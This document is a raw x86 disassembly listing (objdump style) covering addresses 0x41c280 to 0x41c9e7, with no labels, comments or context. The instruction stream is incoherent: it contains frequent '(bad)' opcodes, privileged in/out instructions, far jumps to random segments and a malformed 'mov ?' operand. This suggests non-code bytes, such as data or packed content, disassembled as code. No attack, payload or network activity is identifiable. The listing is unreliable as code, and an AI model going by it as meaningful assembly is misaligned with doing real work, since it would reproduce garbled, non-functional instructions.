  41c280:	xor    eax,0x68454974
  41c285:	push   DWORD PTR [edi]
  41c287:	repz push ds
  41c289:	mov    al,BYTE PTR [esi-0x11c966b3]
  41c28f:	dec    ebp
  41c290:	pop    ebx
  41c291:	adc    esp,edx
  41c293:	dec    DWORD PTR ds:[esi+0x64]
  41c297:	mov    esp,fs
  41c299:	ret    
  41c29a:	nop
  41c29b:	xlat   BYTE PTR ds:[ebx]
  41c29c:	sar    cl,0x7e
  41c29f:	imul   esi,DWORD PTR [esi-0x22fe7559],0xafe6510a
  41c2a9:	push   cs
  41c2aa:	adc    ax,0xef0f
  41c2ae:	into   
  41c2af:	in     al,0xb0
  41c2b1:	dec    ecx
  41c2b2:	out    0xc0,eax
  41c2b4:	in     al,dx
  41c2b5:	push   ss
  41c2b6:	jo     0x41c245
  41c2b8:	and    edi,DWORD PTR [ebp+0x648b7f2e]
  41c2be:	mov    eax,ebp
  41c2c0:	test   BYTE PTR [esi],cl
  41c2c2:	pop    esp
  41c2c3:	inc    ebx
  41c2c4:	rcr    dh,1
  41c2c6:	ins    DWORD PTR es:[edi],dx
  41c2c7:	pop    ebp
  41c2c8:	sbb    ah,BYTE PTR [edx+0x52]
  41c2cb:	mov    ?,WORD PTR [edx-0x6]
  41c2ce:	shl    DWORD PTR [ebp+eiz*8+0x33e27725],0x4e
  41c2d6:	jmp    0xb2461043
  41c2db:	xor    eax,0x30199650
  41c2e0:	(bad)  
  41c2e1:	jae    0x41c2aa
  41c2e3:	jno    0x41c2a9
  41c2e5:	es (bad) 
  41c2e7:	out    dx,eax
  41c2e8:	in     al,dx
  41c2e9:	lods   eax,DWORD PTR ds:[esi]
  41c2ea:	push   esi
  41c2eb:	jecxz  0x41c2c2
  41c2ed:	sahf   
  41c2ee:	and    BYTE PTR [edi+0x1ad55d20],0xff
  41c2f5:	sbb    edi,0xffffffd2
  41c2f8:	(bad)  
  41c2f9:	in     eax,dx
  41c2fa:	inc    edi
  41c2fb:	push   es
  41c2fc:	scas   eax,DWORD PTR es:[edi]
  41c2fd:	repz fcmovne st,st(2)
  41c300:	pop    esp
  41c301:	je     0x41c2f3
  41c303:	jo     0x41c29b
  41c305:	add    eax,0xc76fb6a
  41c30a:	xor    cl,BYTE PTR [esi-0x4f]
  41c30d:	mov    dh,0xcd
  41c30f:	ja     0x41c2fa
  41c311:	ss xor al,0xb1
  41c314:	mov    bl,BYTE PTR [edx]
  41c316:	or     esi,DWORD PTR [esi]
  41c318:	xchg   edi,eax
  41c319:	jbe    0x41c2fd
  41c31b:	sub    edi,ebx
  41c31d:	fwait
  41c31e:	mov    eax,ds:0xa7dd8e05
  41c323:	or     ebp,DWORD PTR [ebx-0x37fc40ea]
  41c329:	inc    edx
  41c32a:	jle    0x41c2ff
  41c32c:	cwde   
  41c32d:	xor    BYTE PTR [ecx],cl
  41c32f:	adc    ebx,0xffffffe4
  41c332:	add    BYTE PTR [ebp+edx*1+0x7],dl
  41c336:	ss mov bh,0x17
  41c339:	cld    
  41c33a:	mov    al,ds:0x446608f1
  41c33f:	add    BYTE PTR [eax],0xd9
  41c342:	iret   
  41c343:	jb     0x41c39d
  41c345:	(bad)  
  41c346:	int    0xb2
  41c348:	xor    dh,ch
  41c34a:	mov    cl,0x3f
  41c34c:	adc    al,0xef
  41c34e:	xor    BYTE PTR [eax+0x54795cd9],0xd4
  41c355:	push   esp
  41c356:	mov    ds:0x1a876f1c,eax
  41c35b:	sbb    DWORD PTR [ebx+0x78],esi
  41c35e:	pop    es
  41c35f:	xchg   edi,eax
  41c360:	scas   eax,DWORD PTR es:[edi]
  41c361:	jo     0x41c316
  41c363:	inc    esp
  41c364:	daa    
  41c365:	add    DWORD PTR [ecx+edx*2+0x1c],edi
  41c369:	daa    
  41c36a:	fld    QWORD PTR [edi+0x3f]
  41c36d:	cmp    esi,DWORD PTR [ebx+0x18f0e713]
  41c373:	xor    dh,BYTE PTR ds:0x1e47f065
  41c379:	gs ins BYTE PTR es:[edi],dx
  41c37b:	pop    edx
  41c37c:	pop    ss
  41c37d:	mov    ecx,fs
  41c37f:	jo     0x41c363
  41c381:	stos   DWORD PTR es:[edi],eax
  41c382:	cmp    ebx,DWORD PTR [ebp-0x3a]
  41c385:	ss sub ecx,ecx
  41c388:	mov    cl,0xb7
  41c38a:	dec    eax
  41c38b:	aaa    
  41c38c:	(bad)  
  41c38d:	pusha  
  41c38e:	scas   eax,DWORD PTR es:[edi]
  41c38f:	push   edi
  41c390:	jp     0x41c352
  41c392:	mov    ebp,edi
  41c394:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c395:	push   ecx
  41c396:	test   al,0x8
  41c398:	xchg   ebp,eax
  41c399:	ror    ah,cl
  41c39b:	test   DWORD PTR [edi],esi
  41c39d:	jns    0x41c3cd
  41c39f:	xlat   BYTE PTR ds:[ebx]
  41c3a0:	or     bh,BYTE PTR [ebx+0x3c63cd8f]
  41c3a6:	fsubr  DWORD PTR [ecx]
  41c3a8:	cdq    
  41c3a9:	mov    eax,ds:0x4b69d290
  41c3ae:	pop    ecx
  41c3af:	push   eax
  41c3b0:	je     0x41c362
  41c3b2:	cdq    
  41c3b3:	cmp    esp,DWORD PTR [ecx]
  41c3b5:	jbe    0x41c36f
  41c3b7:	shr    BYTE PTR [ebx-0x3c5ae60a],cl
  41c3bd:	push   edx
  41c3be:	mov    edi,edx
  41c3c0:	ins    DWORD PTR es:[edi],dx
  41c3c1:	pop    edi
  41c3c2:	repz sub DWORD PTR [esi],esp
  41c3c5:	lods   al,BYTE PTR ds:[esi]
  41c3c6:	jecxz  0x41c3c0
  41c3c8:	sub    dh,BYTE PTR [ebx-0x76]
  41c3cb:	pop    edi
  41c3cc:	mov    bh,0xee
  41c3ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3cf:	pop    edi
  41c3d0:	call   0x32ccf2c2
  41c3d5:	mov    eax,0xc5c57eba
  41c3da:	jnp    0x41c41d
  41c3dc:	and    ebx,esi
  41c3de:	adc    DWORD PTR [esi],esi
  41c3e0:	ds mov esi,0xc5b47bcb
  41c3e6:	lods   eax,DWORD PTR ds:[esi]
  41c3e7:	fs rcl ecx,cl
  41c3ea:	cmc    
  41c3eb:	jo     0x41c436
  41c3ed:	out    0xe,al
  41c3ef:	jg     0x41c42b
  41c3f1:	ror    DWORD PTR [eax],cl
  41c3f3:	jo     0x41c3c9
  41c3f5:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41c3f7:	(bad)  
  41c3f8:	mov    ebx,0x36584736
  41c3fd:	lds    edi,FWORD PTR [ebx+0x72]
  41c400:	bound  ecx,QWORD PTR [eax-0x16]
  41c403:	repz pusha 
  41c405:	or     eax,esp
  41c407:	mov    WORD PTR [edi-0x11650f03],ds
  41c40d:	cmp    edx,DWORD PTR [ebx-0x34]
  41c410:	xchg   esi,eax
  41c411:	jmp    0x3006f0db
  41c416:	ret    0x17ec
  41c419:	or     edi,eax
  41c41b:	sub    ecx,DWORD PTR [esi+0xb308d70]
  41c421:	or     al,0x35
  41c423:	call   0x978ba53b
  41c428:	dec    esi
  41c429:	push   edx
  41c42a:	dec    esi
  41c42b:	push   edx
  41c42c:	into   
  41c42d:	scas   al,BYTE PTR es:[edi]
  41c42e:	das    
  41c42f:	inc    edx
  41c430:	arpl   WORD PTR [edx+ebx*4+0x40],sp
  41c434:	jo     0x41c484
  41c436:	lods   al,BYTE PTR ds:[esi]
  41c437:	inc    eax
  41c438:	sbb    eax,0xd7b0d548
  41c43d:	pop    ebx
  41c43e:	mov    ebx,esi
  41c440:	cmp    ecx,DWORD PTR [eax-0x1a]
  41c443:	and    DWORD PTR [ebp+0x6c],0x44af5368
  41c44a:	nop
  41c44b:	inc    edx
  41c44c:	enter  0x2858,0x2f
  41c450:	idiv   BYTE PTR [esi-0x66]
  41c453:	push   edi
  41c454:	push   eax
  41c455:	xchg   esi,eax
  41c456:	dec    eax
  41c457:	xbegin 0x9a5bb817
  41c45d:	jge    0x41c46d
  41c45f:	iret   
  41c460:	xchg   esp,eax
  41c461:	adc    BYTE PTR [esp+ebp*8-0x749dd3cd],bl
  41c468:	cs dec esp
  41c46a:	dec    eax
  41c46b:	fimul  DWORD PTR [edi]
  41c46d:	push   esi
  41c46e:	inc    esi
  41c46f:	dec    ecx
  41c470:	fsubr  st,st(4)
  41c472:	jmp    0x7b9bd9bb
  41c477:	pop    edi
  41c478:	(bad)  [ebx+0x4f7a0b1d]
  41c47e:	lahf   
  41c47f:	mov    ch,BYTE PTR [edx]
  41c481:	mov    eax,0x1977c3d7
  41c486:	mov    esi,0x8f2a7bc1
  41c48b:	sti    
  41c48c:	mov    ecx,0xde1e2dfd
  41c491:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c492:	pop    ecx
  41c493:	popf   
  41c494:	jo     0x41c503
  41c496:	mov    ebx,ebx
  41c498:	cmp    al,0xe4
  41c49a:	mov    al,ds:0x6802b8dc
  41c49f:	sub    al,0xc6
  41c4a1:	iret   
  41c4a2:	xchg   BYTE PTR [edi-0x64fa6df0],ah
  41c4a8:	xchg   edi,eax
  41c4a9:	mov    esp,0xf16f2b14
  41c4ae:	and    DWORD PTR [esi+0x642539e3],ecx
  41c4b4:	inc    edi
  41c4b5:	inc    esp
  41c4b6:	cld    
  41c4b7:	ins    BYTE PTR es:[edi],dx
  41c4b8:	jg     0x41c472
  41c4ba:	inc    edx
  41c4bb:	test   eax,0xccb45db9
  41c4c0:	xchg   edx,eax
  41c4c1:	les    edx,FWORD PTR [esi-0x5c689587]
  41c4c7:	mov    edi,0x77af15d7
  41c4cc:	into   
  41c4cd:	shl    BYTE PTR [edi+edx*2],0x34
  41c4d1:	dec    edi
  41c4d2:	mov    dh,0xe0
  41c4d4:	loopne 0x41c4ea
  41c4d6:	push   ebx
  41c4d7:	dec    esi
  41c4d8:	inc    edi
  41c4d9:	inc    edx
  41c4da:	xchg   edx,eax
  41c4db:	xchg   ebx,eax
  41c4dc:	fcomp  DWORD PTR [eax-0x3f1b53a9]
  41c4e2:	push   0x5c
  41c4e4:	dec    esp
  41c4e5:	mov    esi,0x2715b2c2
  41c4ea:	or     eax,0xb04be167
  41c4ef:	inc    esp
  41c4f0:	add    DWORD PTR [ebx-0x1d],0xffffff98
  41c4f4:	out    dx,eax
  41c4f5:	sub    ecx,esp
  41c4f7:	xor    ebx,DWORD PTR ss:0x82c3174
  41c4fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4ff:	mov    WORD PTR [ebx+0x2c],cs
  41c502:	pop    ecx
  41c503:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c504:	jmp    0x3d840e78
  41c509:	push   0xffffff9c
  41c50b:	bnd ret 
  41c50d:	cmc    
  41c50e:	dec    esi
  41c50f:	rcl    DWORD PTR [eax+0xb],cl
  41c512:	adc    al,BYTE PTR [esi]
  41c514:	dec    edi
  41c515:	or     eax,0xb19ad3f
  41c51a:	clc    
  41c51b:	mov    cl,0x48
  41c51d:	pop    eax
  41c51e:	jns    0x41c4bf
  41c520:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c521:	jmp    0xa22f:0x57a999d5
  41c528:	sub    al,BYTE PTR [edx]
  41c52a:	and    BYTE PTR [edx-0x47016e1e],0x84
  41c531:	fisub  DWORD PTR [edx-0xf26dfd3]
  41c537:	int3   
  41c538:	jae    0x41c511
  41c53a:	xor    DWORD PTR [ecx-0x66],ecx
  41c53d:	pop    ebx
  41c53e:	es lahf 
  41c540:	stc    
  41c541:	pop    es
  41c542:	or     ebp,DWORD PTR [edx]
  41c544:	push   ss
  41c545:	jle    0x41c577
  41c547:	loope  0x41c53c
  41c549:	popf   
  41c54a:	pushf  
  41c54b:	mov    ds:0x94fc1709,eax
  41c550:	and    DWORD PTR [eax-0x68],ebx
  41c553:	call   FWORD PTR [eax]
  41c555:	ds int3 
  41c557:	adc    ah,BYTE PTR [edx-0x5f]
  41c55a:	inc    ecx
  41c55b:	dec    edi
  41c55c:	sub    edi,esp
  41c55e:	cmc    
  41c55f:	sbb    ah,BYTE PTR [edi+edx*8+0x44]
  41c563:	call   0x6dcd85ab
  41c568:	mov    eax,0xb6f5a051
  41c56d:	shl    DWORD PTR [ebx+0x1a],cl
  41c570:	addr16 xchg esp,eax
  41c572:	mov    esp,0x53365772
  41c577:	mov    al,ds:0xec660a0a
  41c57c:	xchg   edi,eax
  41c57d:	bound  esp,QWORD PTR [ebp-0x77848d8c]
  41c583:	das    
  41c584:	jecxz  0x41c5fa
  41c586:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c587:	idiv   BYTE PTR [ebx+0x3c10d120]
  41c58d:	xor    eax,0x603a5ccc
  41c592:	adc    BYTE PTR [edx-0xe35e7e6],0x24
  41c599:	fldcw  WORD PTR [esp+eiz*8-0xe]
  41c59d:	pop    ebp
  41c59e:	int    0x79
  41c5a0:	jg     0x41c5fb
  41c5a2:	imul   esi,DWORD PTR [edx-0x51881b08]
  41c5a9:	add    al,0xcd
  41c5ab:	fcomp  DWORD PTR [ebp+esi*2+0x56]
  41c5af:	pop    ecx
  41c5b0:	cdq    
  41c5b1:	scas   al,BYTE PTR es:[edi]
  41c5b2:	outs   dx,DWORD PTR ds:[esi]
  41c5b3:	xchg   edi,eax
  41c5b4:	stc    
  41c5b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5b6:	push   ss
  41c5b7:	repnz dec eax
  41c5b9:	jle    0x41c5a8
  41c5bb:	imul   eax,DWORD PTR [edi-0x94695a],0xe3c1b47
  41c5c5:	(bad)  
  41c5c6:	leave  
  41c5c7:	sub    cl,BYTE PTR [edx-0x42]
  41c5ca:	inc    ebx
  41c5cb:	in     eax,0x78
  41c5cd:	fdiv   QWORD PTR [ecx-0x73]
  41c5d0:	call   0x1e09a238
  41c5d5:	sub    bl,BYTE PTR [eax]
  41c5d7:	ds fsubr st,st(6)
  41c5da:	mov    dh,0x9a
  41c5dc:	int3   
  41c5dd:	mov    ecx,0x60b9edf0
  41c5e2:	leave  
  41c5e3:	cmp    esi,DWORD PTR [ebp-0x6d]
  41c5e6:	arpl   WORD PTR [ebx],ax
  41c5e8:	call   0x1c64:0x60bdf22d
  41c5ef:	and    eax,0x392bcecb
  41c5f4:	fwait
  41c5f5:	jae    0x41c5cf
  41c5f7:	pop    ecx
  41c5f8:	mov    esp,esi
  41c5fa:	pop    edi
  41c5fb:	xor    DWORD PTR [ebx-0x4870112f],0x15
  41c602:	add    BYTE PTR [edx+ebp*4],bh
  41c605:	dec    eax
  41c606:	mov    cl,0xf3
  41c608:	and    edi,esp
  41c60a:	sub    eax,0x841d1a2a
  41c60f:	loope  0x41c5c3
  41c611:	push   edx
  41c612:	les    ecx,FWORD PTR [edx+0x1a2c3811]
  41c618:	mov    DWORD PTR [edx+0x55],0x2b2455a6
  41c61f:	ds sub eax,0x79c2ec8f
  41c625:	loope  0x41c633
  41c627:	and    al,0xba
  41c629:	mov    ah,0xbf
  41c62b:	cmp    bl,BYTE PTR [eax-0x479fddbc]
  41c631:	jp     0x41c63a
  41c633:	retf   
  41c634:	xchg   esp,edi
  41c636:	outs   dx,BYTE PTR ds:[esi]
  41c637:	inc    edx
  41c638:	xor    eax,0xe129678a
  41c63d:	mov    al,ds:0x12618bc7
  41c642:	mov    ebp,0x8afdd182
  41c647:	jmp    0xce53:0x2f4daee7
  41c64e:	jns    0x41c66c
  41c650:	cmp    cl,BYTE PTR [ebp+0x1bfd50ac]
  41c656:	aas    
  41c657:	in     al,0x5e
  41c659:	scas   eax,DWORD PTR es:[edi]
  41c65a:	jp     0x41c6d2
  41c65c:	leave  
  41c65d:	jmp    0x84421ec7
  41c662:	fcomp  QWORD PTR [ebx]
  41c664:	push   esi
  41c665:	fst    st(4)
  41c667:	push   edi
  41c668:	mov    esi,0xe7d1f0ee
  41c66d:	dec    ebx
  41c66e:	loop   0x41c604
  41c670:	mov    ecx,0x5438eb27
  41c675:	dec    ebp
  41c676:	sub    eax,0x84ca037f
  41c67b:	add    eax,0x3e11e668
  41c680:	pop    ebp
  41c681:	xchg   ah,dh
  41c683:	jae    0x41c638
  41c685:	aad    0x76
  41c687:	stc    
  41c688:	cmp    bh,BYTE PTR [edx+0x7a806db2]
  41c68e:	sbb    al,ch
  41c690:	pop    ebp
  41c691:	into   
  41c692:	mov    esi,0x5ab85373
  41c697:	loope  0x41c6c4
  41c699:	adc    esi,DWORD PTR [edx+0x74]
  41c69c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c69d:	in     al,dx
  41c69e:	(bad)  
  41c69f:	mov    eax,ds:0xbf52ca1b
  41c6a4:	mov    eax,0xa008ab71
  41c6a9:	push   esi
  41c6aa:	popf   
  41c6ab:	adc    esi,eax
  41c6ad:	add    eax,0xa8ee846f
  41c6b2:	scas   eax,DWORD PTR es:[edi]
  41c6b3:	mov    ebx,0x4a9989aa
  41c6b8:	jo     0x41c6bc
  41c6ba:	dec    esp
  41c6bb:	les    ebp,FWORD PTR [esi]
  41c6bd:	test   eax,0x99411bf0
  41c6c2:	pop    ebp
  41c6c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6c4:	in     eax,0x56
  41c6c6:	push   0x819e0f56
  41c6cb:	es in  al,0x14
  41c6ce:	xor    eax,0xc8999233
  41c6d3:	jo     0x41c6bf
  41c6d5:	leave  
  41c6d6:	mov    bl,BYTE PTR [ecx-0x39]
  41c6d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6da:	mov    edx,0x94f61716
  41c6df:	sti    
  41c6e0:	gs cmp eax,0x468788e0
  41c6e6:	fcom   QWORD PTR [esi+0x12782b8c]
  41c6ec:	mov    al,0x37
  41c6ee:	aas    
  41c6ef:	repz mov ebp,DWORD PTR [edx+0x9]
  41c6f3:	ja     0x41c691
  41c6f5:	dec    edi
  41c6f6:	imul   esi,DWORD PTR [ebx+ebx*8-0x6ace59b0],0x6d8182a0
  41c701:	in     al,dx
  41c702:	sub    ebx,DWORD PTR [edi]
  41c704:	push   ebp
  41c705:	stc    
  41c706:	cmp    edx,ebp
  41c708:	rcl    esp,1
  41c70a:	(bad)  
  41c70b:	hlt    
  41c70c:	pushf  
  41c70d:	mov    al,0x55
  41c70f:	and    edi,DWORD PTR [ebp+0x70]
  41c712:	pop    eax
  41c713:	stos   DWORD PTR es:[edi],eax
  41c714:	or     eax,0x57910678
  41c719:	je     0x41c70e
  41c71b:	mov    dh,bl
  41c71d:	(bad)  
  41c71f:	popf   
  41c720:	ins    DWORD PTR es:[edi],dx
  41c721:	daa    
  41c722:	loopne 0x41c6e8
  41c724:	sub    eax,0x920d52b2
  41c729:	adc    eax,DWORD PTR [ebp-0x45a058e6]
  41c72f:	mov    ebx,0xba466296
  41c734:	retf   0x36a1
  41c737:	xchg   BYTE PTR [edx],bl
  41c739:	je     0x41c792
  41c73b:	dec    edx
  41c73c:	mov    ch,0x87
  41c73e:	call   0xc6c9:0x5c383708
  41c745:	icebp  
  41c746:	imul   DWORD PTR [esi]
  41c748:	jmp    0xa901:0x71ef28a1
  41c74f:	test   al,0xb4
  41c751:	repnz pop es
  41c753:	or     eax,0x8f2b7ec5
  41c758:	inc    ebp
  41c759:	mov    edi,0x74a0a2ac
  41c75e:	loope  0x41c7c5
  41c760:	and    BYTE PTR [ebx+0x6f8ee95],0xf3
  41c767:	bound  ebx,QWORD PTR [ebx]
  41c769:	pop    edi
  41c76a:	lods   al,BYTE PTR ds:[esi]
  41c76b:	bound  edx,QWORD PTR [eax+0x353d5fcd]
  41c771:	in     al,0x6c
  41c773:	test   al,0x5b
  41c775:	xchg   esi,eax
  41c776:	dec    ebx
  41c777:	(bad)  
  41c778:	adc    BYTE PTR ds:0x8611e470,bl
  41c77e:	jmp    0x6fff62b9
  41c783:	pop    ecx
  41c784:	arpl   bp,ax
  41c786:	push   esp
  41c787:	push   es
  41c788:	sub    ch,BYTE PTR [ebp+0x4cd6c8de]
  41c78e:	js     0x41c782
  41c790:	mov    dl,0x40
  41c792:	cld    
  41c793:	inc    ebp
  41c794:	lock jle 0x41c7d6
  41c797:	(bad)  
  41c798:	int3   
  41c799:	mov    cs,eax
  41c79b:	xchg   ecx,eax
  41c79c:	sbb    eax,edi
  41c79e:	sbb    al,0x56
  41c7a0:	lods   eax,DWORD PTR ds:[esi]
  41c7a1:	jmp    0x41c796
  41c7a3:	pop    ds
  41c7a4:	sub    DWORD PTR [edi],esp
  41c7a6:	xchg   ebp,eax
  41c7a7:	jmp    0x41c826
  41c7a9:	(bad)  
  41c7aa:	std    
  41c7ab:	scas   eax,DWORD PTR es:[edi]
  41c7ac:	retf   
  41c7ad:	sbb    ecx,eax
  41c7af:	scas   al,BYTE PTR es:[edi]
  41c7b0:	mov    bh,0xe
  41c7b2:	and    DWORD PTR [edx+0x1],esi
  41c7b5:	std    
  41c7b6:	inc    eax
  41c7b7:	inc    esp
  41c7b8:	imul   ebx,ebp,0xfffffff0
  41c7bb:	or     ch,bh
  41c7bd:	xor    al,0xad
  41c7bf:	jb     0x41c7a1
  41c7c1:	cli    
  41c7c2:	or     BYTE PTR ds:0x6a009481,ch
  41c7c8:	xchg   esp,eax
  41c7c9:	or     al,0x8a
  41c7cb:	jne    0x41c758
  41c7cd:	fs in  eax,0x80
  41c7d0:	ss mov eax,es:0x5782cb7d
  41c7d7:	dec    edx
  41c7d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c7d9:	inc    esi
  41c7da:	in     al,dx
  41c7db:	mov    bh,0x40
  41c7dd:	in     al,0xf1
  41c7df:	bound  edi,QWORD PTR [esi+0x7d510187]
  41c7e5:	jge    0x41c849
  41c7e7:	cwde   
  41c7e8:	pop    ecx
  41c7e9:	xchg   ebx,eax
  41c7ea:	xlat   BYTE PTR ds:[ebx]
  41c7eb:	pop    ss
  41c7ec:	jns    0x41c7f1
  41c7ee:	int3   
  41c7ef:	and    eax,0x72384c2e
  41c7f4:	pop    ebx
  41c7f5:	push   edx
  41c7f6:	mov    al,BYTE PTR [esi-0x49ea057]
  41c7fc:	push   0x4fe76c00
  41c801:	mov    ah,BYTE PTR [ecx]
  41c803:	mov    esp,0x16a4fc96
  41c808:	jl     0x41c84d
  41c80a:	fcmovnu st,st(3)
  41c80c:	and    al,0x37
  41c80e:	jmp    0x51cef64a
  41c813:	test   eax,0x2db9af06
  41c818:	iret   
  41c819:	jmp    0x41c7e1
  41c81b:	rcl    DWORD PTR [ebx+0x32b52588],1
  41c821:	lock ror BYTE PTR [ebx],0x3d
  41c825:	ins    BYTE PTR es:[edi],dx
  41c826:	adc    al,0xa5
  41c828:	xor    cl,BYTE PTR [edi+0x1a]
  41c82b:	dec    edi
  41c82c:	lahf   
  41c82d:	(bad)  
  41c82e:	test   al,0x9d
  41c830:	xchg   esp,eax
  41c831:	icebp  
  41c832:	call   0xfb932a7a
  41c837:	add    BYTE PTR [ecx-0x1a],cl
  41c83a:	add    al,BYTE PTR [eax+0x78e5e473]
  41c840:	icebp  
  41c841:	sbb    eax,0xa4ced97f
  41c846:	sbb    ah,ah
  41c848:	mov    cl,0xbf
  41c84a:	and    al,0x31
  41c84c:	sbb    BYTE PTR [eax],0xb4
  41c84f:	dec    edx
  41c850:	inc    ebp
  41c851:	fcomp  QWORD PTR [edx-0x12]
  41c854:	aaa    
  41c855:	jl     0x41c87c
  41c857:	jns    0x41c8cc
  41c859:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c85a:	das    
  41c85b:	rcl    DWORD PTR [esi+edx*1-0x3a],1
  41c85f:	ror    DWORD PTR [esi+0x7],1
  41c862:	icebp  
  41c863:	push   es
  41c864:	or     BYTE PTR [eax+0x8],dl
  41c867:	mov    edi,0x6c992b38
  41c86c:	xchg   esp,eax
  41c86d:	mov    ds:0x322732f7,al
  41c872:	out    dx,eax
  41c873:	retf   0x608d
  41c876:	and    al,0x70
  41c878:	xor    al,0x6f
  41c87a:	fdivr  DWORD PTR [edx]
  41c87c:	jp     0x41c858
  41c87e:	cs cdq 
  41c880:	sbb    BYTE PTR [eax-0x6],dh
  41c883:	jmp    0x5ddd1447
  41c888:	add    ecx,eax
  41c88a:	mov    ecx,0xfea3d332
  41c88f:	pop    ss
  41c890:	stos   BYTE PTR es:[edi],al
  41c891:	test   eax,0xebafecb8
  41c896:	fdivr  QWORD PTR [ecx]
  41c898:	movlps xmm2,QWORD PTR [eax]
  41c89b:	and    ebx,DWORD PTR [ebp-0x5eeee626]
  41c8a1:	test   BYTE PTR [esi+0x36],bl
  41c8a4:	ja     0x41c8be
  41c8a6:	call   0x5db0:0x82c493cf
  41c8ad:	push   ds
  41c8ae:	js     0x41c8c8
  41c8b0:	enter  0x166b,0x5
  41c8b4:	add    ah,0xb3
  41c8b7:	test   DWORD PTR [edi],ecx
  41c8b9:	pop    edi
  41c8ba:	mov    BYTE PTR [edi-0x6ddb52cc],dh
  41c8c0:	test   BYTE PTR [ebx-0x60],al
  41c8c3:	inc    ebx
  41c8c4:	push   edi
  41c8c5:	adc    edi,DWORD PTR [ebx]
  41c8c7:	int    0x6f
  41c8c9:	lock fsub QWORD PTR [edx+0x37e659bc]
  41c8d0:	stos   DWORD PTR es:[edi],eax
  41c8d1:	cmp    DWORD PTR ds:0xfd5f661e,ebx
  41c8d7:	dec    DWORD PTR [ebx]
  41c8d9:	ror    BYTE PTR [edi-0x64595891],0x5e
  41c8e0:	sub    edi,esi
  41c8e2:	inc    ebp
  41c8e3:	xchg   edi,eax
  41c8e4:	mov    WORD PTR [ecx+0x7c0bc2fc],fs
  41c8ea:	adc    eax,0x5de47da7
  41c8ef:	sub    al,0x3b
  41c8f1:	mov    esi,0x233717d7
  41c8f6:	cdq    
  41c8f7:	stc    
  41c8f8:	rol    DWORD PTR [ebx+eiz*4],1
  41c8fb:	sub    DWORD PTR [ebp-0x578960c0],0xffffffcc
  41c902:	and    eax,0x697aab5d
  41c907:	mov    edx,0xf06e624c
  41c90c:	or     ebx,ebp
  41c90e:	test   eax,0xd2286ed2
  41c913:	popa   
  41c914:	push   0xffffff9a
  41c916:	dec    edx
  41c917:	and    DWORD PTR [ecx-0x6e288a3d],esp
  41c91d:	hlt    
  41c91e:	shl    BYTE PTR [edx+0x6cb6a4f],0x7b
  41c925:	pop    edi
  41c926:	dec    ebp
  41c927:	and    eax,0x2f7334ee
  41c92c:	jae    0x41c90b
  41c92e:	xor    DWORD PTR [eax-0x53b19da2],eax
  41c934:	sub    eax,0x7bb4f4d1
  41c939:	inc    edx
  41c93a:	bound  esi,QWORD PTR [ebx-0x68]
  41c93d:	ret    0xef9d
  41c940:	add    esi,ecx
  41c942:	pop    ss
  41c943:	dec    edx
  41c944:	add    ebx,ebp
  41c946:	jge    0x41c906
  41c948:	popa   
  41c949:	fistp  WORD PTR [ecx+ecx*4]
  41c94c:	push   esp
  41c94d:	in     eax,0xb1
  41c94f:	sub    BYTE PTR [edx-0x32f40f0a],al
  41c955:	sti    
  41c956:	push   es
  41c957:	push   eax
  41c958:	lods   eax,DWORD PTR ds:[esi]
  41c959:	ret    
  41c95a:	sbb    bh,bh
  41c95c:	pusha  
  41c95d:	test   bh,bh
  41c95f:	stos   BYTE PTR es:[edi],al
  41c960:	(bad)  
  41c961:	push   ss
  41c962:	sbb    al,0x66
  41c964:	dec    bx
  41c966:	addr16 leave 
  41c968:	mov    al,ds:0x6ecc6d63
  41c96d:	adc    al,0xd2
  41c96f:	stc    
  41c970:	fsubr  DWORD PTR [eax-0x2]
  41c973:	test   BYTE PTR [ecx+0x50],dl
  41c976:	ret    0x4233
  41c979:	ja     0x41c8fb
  41c97b:	(bad)  
  41c97c:	jbe    0x41c9ee
  41c97e:	call   0x15c7:0xf0ea6d4
  41c985:	add    DWORD PTR [esi-0x48],ebp
  41c988:	stos   BYTE PTR es:[edi],al
  41c989:	(bad)  
  41c98b:	inc    esp
  41c98c:	out    0x3e,al
  41c98e:	mov    edx,0xa9808573
  41c993:	stos   BYTE PTR es:[edi],al
  41c994:	xor    DWORD PTR [ecx+edx*4+0xc57b63e],edx
  41c99b:	xchg   DWORD PTR [ecx+0x69],ebx
  41c99e:	cwde   
  41c99f:	scas   eax,DWORD PTR es:[edi]
  41c9a0:	std    
  41c9a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9a2:	retf   
  41c9a3:	sub    DWORD PTR [edi-0x3ff66303],ecx
  41c9a9:	jb     0x41ca01
  41c9ab:	mov    ecx,0xd0aa87b4
  41c9b0:	and    esp,eax
  41c9b2:	dec    esi
  41c9b3:	stos   DWORD PTR es:[edi],eax
  41c9b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9b5:	out    dx,al
  41c9b6:	push   ecx
  41c9b7:	loop   0x41c97d
  41c9b9:	inc    esi
  41c9ba:	fld    QWORD PTR [edi+0x2e]
  41c9bd:	sub    BYTE PTR [ecx],0x97
  41c9c0:	call   0x5424ce7e
  41c9c5:	lods   eax,DWORD PTR ds:[esi]
  41c9c6:	fbld   TBYTE PTR [esi+0x51]
  41c9c9:	hlt    
  41c9ca:	lods   eax,DWORD PTR ds:[esi]
  41c9cb:	mov    ch,ah
  41c9cd:	iret   
  41c9ce:	cmp    ch,cl
  41c9d0:	shl    DWORD PTR [edx-0x1e6cbcb3],cl
  41c9d6:	das    
  41c9d7:	sbb    bh,BYTE PTR [edx]
  41c9d9:	int3   
  41c9da:	repz push eax
  41c9dc:	jae    0x41c9fd
  41c9de:	nop
  41c9df:	jb     0x41c9a2
  41c9e1:	push   0xd23a9dcb
  41c9e6:	out    dx,eax
  41c9e7:	jns    0x41c9d0
